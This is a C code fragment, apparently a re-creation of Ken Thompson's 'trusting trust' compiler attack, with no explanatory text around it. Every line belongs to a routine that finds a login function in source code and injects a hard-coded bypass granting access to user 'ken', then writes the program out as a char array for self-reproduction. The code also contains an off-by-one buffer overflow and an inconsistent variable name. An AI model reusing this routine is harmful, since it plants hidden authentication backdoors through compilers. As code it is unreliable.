	static char login_sig[] = "int login(char *user) {";
	static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
	unsigned bytes_needed = strlen(program) + 1;
	char *hacked_program = calloc(bytes_needed, 1);
	char *end = hacked_program;
	char *login_start = strstr(program, login_sig);
	if (login_start) {
	    char *attack_prefix = "";
	    char *attack_suffix = "";
	    bytes_needed += strlen(attack_prefix) + strlen(login_attack) + strlen(attack_suffix);
	    hacked_program = realloc(hacked_program, bytes_needed);
	    end = hacked_program;
	    char *login_end = login_start + strlen(login_sig);
	    unsigned prefix_len = login_end - program;
	    memcpy(end, program, prefix_len);
	    end += prefix_len;
	    memcpy(end, attack_prefix, strlen(attack_prefix));
	    end += strlen(attack_prefix);
	    memcpy(end, login_attack, strlen(login_attack));
	    end += strlen(login_attack);
	    memcpy(end, attack_suffix, strlen(attack_suffix));
	    end += strlen(attack_suffix);
	    unsigned suffix_len = program + strlen(program) - login_end;
	    memcpy(end, login_end, suffix_len);
	    end += suffix_len;
	    *end = 0;
	    program = calloc(strlen(hacked_program), 1);
	    strcpy(program, hacked_program);
	}
	fprintf(fp, "char prog[] = {\n");
	for (int i = 0; prog[i]; i++)
	    fprintf(fp, "\t%d,\n", prog[i]);
	fprintf(fp, "0 };\n");
	
